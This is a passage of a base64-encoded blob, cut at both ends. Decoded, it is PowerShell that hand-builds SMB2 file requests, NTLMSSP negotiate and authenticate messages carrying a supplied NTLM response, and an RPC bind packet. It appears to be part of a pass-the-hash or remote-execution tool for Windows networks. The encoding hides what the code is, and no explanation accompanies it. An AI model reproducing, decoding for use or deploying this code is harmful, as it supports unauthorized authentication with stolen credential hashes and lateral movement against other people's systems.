pcGUpCgogICAgICAgICRwYWNrZXRfbmFtZWRfcGlwZV9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfbmFtZWRfcGlwZS5MZW5ndGgpCiAgICAgICAgJHBhY2tldF9uYW1lZF9waXBlX2xlbmd0aCA9ICRwYWNrZXRfbmFtZWRfcGlwZV9sZW5ndGhbMCwxXQoKICAgICAgICAkcGFja2V0X1NNQjJDcmVhdGVSZXF1ZXN0RmlsZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfU3RydWN0dXJlU2l6ZSIsW0J5dGVbXV0oMHgzOSwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJDcmVhdGVSZXF1ZXN0RmlsZS5BZGQoIlNNQjJDcmVhdGVSZXF1ZXN0RmlsZV9GbGFncyIsW0J5dGVbXV0oMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfUmVxdWVzdGVkT3Bsb2NrTGV2ZWwiLFtCeXRlW11dKDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX0ltcGVyc29uYXRpb24iLFtCeXRlW11dKDB4MDIsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX1NNQkNyZWF0ZUZsYWdzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX0Rlc2lyZWRBY2Nlc3MiLFtCeXRlW11dKDB4MDMsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX0ZpbGVBdHRyaWJ1dGVzIixbQnl0ZVtdXSgweDgwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJDcmVhdGVSZXF1ZXN0RmlsZS5BZGQoIlNNQjJDcmVhdGVSZXF1ZXN0RmlsZV9TaGFyZUFjY2VzcyIsW0J5dGVbXV0oMHgwMSwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfQ3JlYXRlRGlzcG9zaXRpb24iLFtCeXRlW11dKDB4MDEsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX0NyZWF0ZU9wdGlvbnMiLFtCeXRlW11dKDB4NDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX05hbWVPZmZzZXQiLFtCeXRlW11dKDB4NzgsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfTmFtZUxlbmd0aCIsJHBhY2tldF9uYW1lZF9waXBlX2xlbmd0aCkKICAgICAgICAkcGFja2V0X1NNQjJDcmVhdGVSZXF1ZXN0RmlsZS5BZGQoIlNNQjJDcmVhdGVSZXF1ZXN0RmlsZV9DcmVhdGVDb250ZXh0c09mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUuQWRkKCJTTUIyQ3JlYXRlUmVxdWVzdEZpbGVfQ3JlYXRlQ29udGV4dHNMZW5ndGgiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkNyZWF0ZVJlcXVlc3RGaWxlLkFkZCgiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX0J1ZmZlciIsJHBhY2tldF9uYW1lZF9waXBlKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TTUIyQ3JlYXRlUmVxdWVzdEZpbGUKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U01CMlJlYWRSZXF1ZXN0KCkKICAgIHsKICAgICAgICBwYXJhbSAoW0J5dGVbXV0kcGFja2V0X2ZpbGVfSUQpCgogICAgICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAkcGFja2V0X1NNQjJSZWFkUmVxdWVzdC5BZGQoIlNNQjJSZWFkUmVxdWVzdF9TdHJ1Y3R1cmVTaXplIixbQnl0ZVtdXSgweDMxLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X1BhZGRpbmciLFtCeXRlW11dKDB4NTApKQogICAgICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X0ZsYWdzIixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJSZWFkUmVxdWVzdC5BZGQoIlNNQjJSZWFkUmVxdWVzdF9MZW5ndGgiLFtCeXRlW11dKDB4MDAsMHgwMCwweDEwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X09mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJSZWFkUmVxdWVzdC5BZGQoIlNNQjJSZWFkUmVxdWVzdF9GaWxlSUQiLCRwYWNrZXRfZmlsZV9JRCkKICAgICAgICAkcGFja2V0X1NNQjJSZWFkUmVxdWVzdC5BZGQoIlNNQjJSZWFkUmVxdWVzdF9NaW5pbXVtQ291bnQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X0NoYW5uZWwiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X1JlbWFpbmluZ0J5dGVzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJSZWFkUmVxdWVzdC5BZGQoIlNNQjJSZWFkUmVxdWVzdF9SZWFkQ2hhbm5lbEluZm9PZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyUmVhZFJlcXVlc3QuQWRkKCJTTUIyUmVhZFJlcXVlc3RfUmVhZENoYW5uZWxJbmZvTGVuZ3RoIixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMlJlYWRSZXF1ZXN0LkFkZCgiU01CMlJlYWRSZXF1ZXN0X0J1ZmZlciIsW0J5dGVbXV0oMHgzMCkpCgogICAgICAgIHJldHVybiAkcGFja2V0X1NNQjJSZWFkUmVxdWVzdAogICAgfQoKICAgIGZ1bmN0aW9uIEdldC1QYWNrZXRTTUIyV3JpdGVSZXF1ZXN0KCkKICAgIHsKICAgICAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfZmlsZV9JRCxbSW50XSRwYWNrZXRfUlBDX2xlbmd0aCkKCiAgICAgICAgW0J5dGVbXV0kcGFja2V0X3dyaXRlX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9SUENfbGVuZ3RoKQoKICAgICAgICAkcGFja2V0X1NNQjJXcml0ZVJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQogICAgICAgICRwYWNrZXRfU01CMldyaXRlUmVxdWVzdC5BZGQoIlNNQjJXcml0ZVJlcXVlc3RfU3RydWN0dXJlU2l6ZSIsW0J5dGVbXV0oMHgzMSwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJXcml0ZVJlcXVlc3QuQWRkKCJTTUIyV3JpdGVSZXF1ZXN0X0RhdGFPZmZzZXQiLFtCeXRlW11dKDB4NzAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyV3JpdGVSZXF1ZXN0LkFkZCgiU01CMldyaXRlUmVxdWVzdF9MZW5ndGgiLCRwYWNrZXRfd3JpdGVfbGVuZ3RoKQogICAgICAgICRwYWNrZXRfU01CMldyaXRlUmVxdWVzdC5BZGQoIlNNQjJXcml0ZVJlcXVlc3RfT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMldyaXRlUmVxdWVzdC5BZGQoIlNNQjJXcml0ZVJlcXVlc3RfRmlsZUlEIiwkcGFja2V0X2ZpbGVfSUQpCiAgICAgICAgJHBhY2tldF9TTUIyV3JpdGVSZXF1ZXN0LkFkZCgiU01CMldyaXRlUmVxdWVzdF9DaGFubmVsIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJXcml0ZVJlcXVlc3QuQWRkKCJTTUIyV3JpdGVSZXF1ZXN0X1JlbWFpbmluZ0J5dGVzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJXcml0ZVJlcXVlc3QuQWRkKCJTTUIyV3JpdGVSZXF1ZXN0X1dyaXRlQ2hhbm5lbEluZm9PZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyV3JpdGVSZXF1ZXN0LkFkZCgiU01CMldyaXRlUmVxdWVzdF9Xcml0ZUNoYW5uZWxJbmZvTGVuZ3RoIixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMldyaXRlUmVxdWVzdC5BZGQoIlNNQjJXcml0ZVJlcXVlc3RfRmxhZ3MiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TTUIyV3JpdGVSZXF1ZXN0CiAgICB9CgogICAgZnVuY3Rpb24gR2V0LVBhY2tldFNNQjJDbG9zZVJlcXVlc3QoKQogICAgewogICAgICAgIHBhcmFtIChbQnl0ZVtdXSRwYWNrZXRfZmlsZV9JRCkKCiAgICAgICAgJHBhY2tldF9TTUIyQ2xvc2VSZXF1ZXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAkcGFja2V0X1NNQjJDbG9zZVJlcXVlc3QuQWRkKCJTTUIyQ2xvc2VSZXF1ZXN0X1N0cnVjdHVyZVNpemUiLFtCeXRlW11dKDB4MTgsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyQ2xvc2VSZXF1ZXN0LkFkZCgiU01CMkNsb3NlUmVxdWVzdF9GbGFncyIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJDbG9zZVJlcXVlc3QuQWRkKCJTTUIyQ2xvc2VSZXF1ZXN0X1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJDbG9zZVJlcXVlc3QuQWRkKCJTTUIyQ2xvc2VSZXF1ZXN0X0ZpbGVJRCIsJHBhY2tldF9maWxlX0lEKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TTUIyQ2xvc2VSZXF1ZXN0CiAgICB9CgogICAgZnVuY3Rpb24gR2V0LVBhY2tldFNNQjJUcmVlRGlzY29ubmVjdFJlcXVlc3QoKQogICAgewogICAgICAgICRwYWNrZXRfU01CMlRyZWVEaXNjb25uZWN0UmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUIyVHJlZURpc2Nvbm5lY3RSZXF1ZXN0LkFkZCgiU01CMlRyZWVEaXNjb25uZWN0UmVxdWVzdF9TdHJ1Y3R1cmVTaXplIixbQnl0ZVtdXSgweDA0LDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMlRyZWVEaXNjb25uZWN0UmVxdWVzdC5BZGQoIlNNQjJUcmVlRGlzY29ubmVjdFJlcXVlc3RfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDAsMHgwMCkpCgogICAgICAgIHJldHVybiAkcGFja2V0X1NNQjJUcmVlRGlzY29ubmVjdFJlcXVlc3QKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U01CMlNlc3Npb25Mb2dvZmZSZXF1ZXN0KCkKICAgIHsKICAgICAgICAkcGFja2V0X1NNQjJTZXNzaW9uTG9nb2ZmUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUIyU2Vzc2lvbkxvZ29mZlJlcXVlc3QuQWRkKCJTTUIyU2Vzc2lvbkxvZ29mZlJlcXVlc3RfU3RydWN0dXJlU2l6ZSIsW0J5dGVbXV0oMHgwNCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJTZXNzaW9uTG9nb2ZmUmVxdWVzdC5BZGQoIlNNQjJTZXNzaW9uTG9nb2ZmUmVxdWVzdF9SZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCwweDAwKSkKCiAgICAgICAgcmV0dXJuICRwYWNrZXRfU01CMlNlc3Npb25Mb2dvZmZSZXF1ZXN0CiAgICB9CgogICAgI05UTE0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0TlRMTVNTUE5lZ290aWF0ZSgpCiAgICB7CiAgICAgICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X25lZ290aWF0ZV9mbGFncyxbQnl0ZVtdXSRwYWNrZXRfdmVyc2lvbikKCiAgICAgICAgW0J5dGVbXV0kcGFja2V0X05UTE1TU1BfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygzMiArICRwYWNrZXRfdmVyc2lvbi5MZW5ndGgpCiAgICAgICAgJHBhY2tldF9OVExNU1NQX2xlbmd0aCA9ICRwYWNrZXRfTlRMTVNTUF9sZW5ndGhbMF0KICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfQVNOX2xlbmd0aF8xID0gJHBhY2tldF9OVExNU1NQX2xlbmd0aFswXSArIDMyCiAgICAgICAgW0J5dGVbXV0kcGFja2V0X0FTTl9sZW5ndGhfMiA9ICRwYWNrZXRfTlRMTVNTUF9sZW5ndGhbMF0gKyAyMgogICAgICAgIFtCeXRlW11dJHBhY2tldF9BU05fbGVuZ3RoXzMgPSAkcGFja2V0X05UTE1TU1BfbGVuZ3RoWzBdICsgMjAKICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfQVNOX2xlbmd0aF80ID0gJHBhY2tldF9OVExNU1NQX2xlbmd0aFswXSArIDIKCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX0luaXRpYWxDb250ZXh0VG9rZW5JRCIsW0J5dGVbXV0oMHg2MCkpICMgdGhlIEFTTi4xIGtleSBuYW1lcyBhcmUgbGlrZWx5IG5vdCBhbGwgY29ycmVjdAogICAgICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfSW5pdGlhbGNvbnRleHRUb2tlbkxlbmd0aCIsJHBhY2tldF9BU05fbGVuZ3RoXzEpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9UaGlzTWVjaElEIixbQnl0ZVtdXSgweDA2KSkKICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX1RoaXNNZWNoTGVuZ3RoIixbQnl0ZVtdXSgweDA2KSkKICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX09JRCIsW0J5dGVbXV0oMHgyYiwweDA2LDB4MDEsMHgwNSwweDA1LDB4MDIpKQogICAgICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfSW5uZXJDb250ZXh0VG9rZW5JRCIsW0J5dGVbXV0oMHhhMCkpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9Jbm5lckNvbnRleHRUb2tlbkxlbmd0aCIsJHBhY2tldF9BU05fbGVuZ3RoXzIpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9Jbm5lckNvbnRleHRUb2tlbklEMiIsW0J5dGVbXV0oMHgzMCkpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9Jbm5lckNvbnRleHRUb2tlbkxlbmd0aDIiLCRwYWNrZXRfQVNOX2xlbmd0aF8zKQogICAgICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfTWVjaFR5cGVzSUQiLFtCeXRlW11dKDB4YTApKQogICAgICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfTWVjaFR5cGVzTGVuZ3RoIixbQnl0ZVtdXSgweDBlKSkKICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX01lY2hUeXBlc0lEMiIsW0J5dGVbXV0oMHgzMCkpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9NZWNoVHlwZXNMZW5ndGgyIixbQnl0ZVtdXSgweDBjKSkKICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX01lY2hUeXBlc0lEMyIsW0J5dGVbXV0oMHgwNikpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9NZWNoVHlwZXNMZW5ndGgzIixbQnl0ZVtdXSgweDBhKSkKICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX01lY2hUeXBlIixbQnl0ZVtdXSgweDJiLDB4MDYsMHgwMSwweDA0LDB4MDEsMHg4MiwweDM3LDB4MDIsMHgwMiwweDBhKSkKICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX01lY2hUb2tlbklEIixbQnl0ZVtdXSgweGEyKSkKICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX01lY2hUb2tlbkxlbmd0aCIsJHBhY2tldF9BU05fbGVuZ3RoXzQpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9OVExNU1NQSUQiLFtCeXRlW11dKDB4MDQpKQogICAgICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfTlRMTVNTUExlbmd0aCIsJHBhY2tldF9OVExNU1NQX2xlbmd0aCkKICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX0lkZW50aWZpZXIiLFtCeXRlW11dKDB4NGUsMHg1NCwweDRjLDB4NGQsMHg1MywweDUzLDB4NTAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9NZXNzYWdlVHlwZSIsW0J5dGVbXV0oMHgwMSwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9OZWdvdGlhdGVGbGFncyIsJHBhY2tldF9uZWdvdGlhdGVfZmxhZ3MpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9DYWxsaW5nV29ya3N0YXRpb25Eb21haW4iLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9DYWxsaW5nV29ya3N0YXRpb25OYW1lIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQoKICAgICAgICBpZigkcGFja2V0X3ZlcnNpb24pCiAgICAgICAgewogICAgICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX1ZlcnNpb24iLCRwYWNrZXRfdmVyc2lvbikKICAgICAgICB9CgogICAgICAgIHJldHVybiAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0TlRMTVNTUEF1dGgoKQogICAgewogICAgICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9OVExNX3Jlc3BvbnNlKQoKICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfTlRMTVNTUF9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfTlRMTV9yZXNwb25zZS5MZW5ndGgpCiAgICAgICAgJHBhY2tldF9OVExNU1NQX2xlbmd0aCA9ICRwYWNrZXRfTlRMTVNTUF9sZW5ndGhbMSwwXQogICAgICAgIFtCeXRlW11dJHBhY2tldF9BU05fbGVuZ3RoXzEgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfTlRMTV9yZXNwb25zZS5MZW5ndGggKyAxMikKICAgICAgICAkcGFja2V0X0FTTl9sZW5ndGhfMSA9ICRwYWNrZXRfQVNOX2xlbmd0aF8xWzEsMF0KICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfQVNOX2xlbmd0aF8yID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X05UTE1fcmVzcG9uc2UuTGVuZ3RoICsgOCkKICAgICAgICAkcGFja2V0X0FTTl9sZW5ndGhfMiA9ICRwYWNrZXRfQVNOX2xlbmd0aF8yWzEsMF0KICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfQVNOX2xlbmd0aF8zID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X05UTE1fcmVzcG9uc2UuTGVuZ3RoICsgNCkKICAgICAgICAkcGFja2V0X0FTTl9sZW5ndGhfMyA9ICRwYWNrZXRfQVNOX2xlbmd0aF8zWzEsMF0KCiAgICAgICAgJHBhY2tldF9OVExNU1NQQXV0aCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9OVExNU1NQQXV0aC5BZGQoIk5UTE1TU1BBdXRoX0FTTklEIixbQnl0ZVtdXSgweGExLDB4ODIpKQogICAgICAgICRwYWNrZXRfTlRMTVNTUEF1dGguQWRkKCJOVExNU1NQQXV0aF9BU05MZW5ndGgiLCRwYWNrZXRfQVNOX2xlbmd0aF8xKQogICAgICAgICRwYWNrZXRfTlRMTVNTUEF1dGguQWRkKCJOVExNU1NQQXV0aF9BU05JRDIiLFtCeXRlW11dKDB4MzAsMHg4MikpCiAgICAgICAgJHBhY2tldF9OVExNU1NQQXV0aC5BZGQoIk5UTE1TU1BBdXRoX0FTTkxlbmd0aDIiLCRwYWNrZXRfQVNOX2xlbmd0aF8yKQogICAgICAgICRwYWNrZXRfTlRMTVNTUEF1dGguQWRkKCJOVExNU1NQQXV0aF9BU05JRDMiLFtCeXRlW11dKDB4YTIsMHg4MikpCiAgICAgICAgJHBhY2tldF9OVExNU1NQQXV0aC5BZGQoIk5UTE1TU1BBdXRoX0FTTkxlbmd0aDMiLCRwYWNrZXRfQVNOX2xlbmd0aF8zKQogICAgICAgICRwYWNrZXRfTlRMTVNTUEF1dGguQWRkKCJOVExNU1NQQXV0aF9OVExNU1NQSUQiLFtCeXRlW11dKDB4MDQsMHg4MikpCiAgICAgICAgJHBhY2tldF9OVExNU1NQQXV0aC5BZGQoIk5UTE1TU1BBdXRoX05UTE1TU1BMZW5ndGgiLCRwYWNrZXRfTlRMTVNTUF9sZW5ndGgpCiAgICAgICAgJHBhY2tldF9OVExNU1NQQXV0aC5BZGQoIk5UTE1TU1BBdXRoX05UTE1SZXNwb25zZSIsJHBhY2tldF9OVExNX3Jlc3BvbnNlKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9OVExNU1NQQXV0aAogICAgfQoKICAgICNSUEMKCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0UlBDQmluZCgpCiAgICB7CiAgICAgICAgcGFyYW0oW0ludF0kcGFja2V0X2NhbGxfSUQsW0J5dGVbXV0kcGFja2V0X21heF9mcmFnLFtCeXRlW11dJHBhY2tldF9udW1fY3R4X2l0ZW1zLFtCeXRlW11dJHBhY2tldF9jb250ZXh0X0lELFtCeXRlW11dJHBhY2tldF9VVUlELFtCeXRlW11dJHBhY2tldF9VVUlEX3ZlcnNpb24pCgogICAgICAgIFtCeXRlW11dJHBhY2tldF9jYWxsX0lEX2J5dGVzID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X2NhbGxfSUQpCgogICAgICAgICRwYWNrZXRfUlBDQmluZCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9WZXJzaW9uIixbQnl0ZVtdXSgweDA1KSkKICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1ZlcnNpb25NaW5vciIsW0J5dGVbXV0oMHgwMCkpCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9QYWNrZXRUeXBlIixbQnl0ZVtdXSgweDBiKSkKICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1BhY2tldEZsYWdzIixbQnl0ZVtdXSgweDAzKSkKICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0RhdGFSZXByZXNlbnRhdGlvbiIsW0J5dGVbXV0oMHgxMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9GcmFnTGVuZ3RoIixbQnl0ZVtdXSgweDQ4LDB4MDApKQogICAgICAgICRwYWNrZ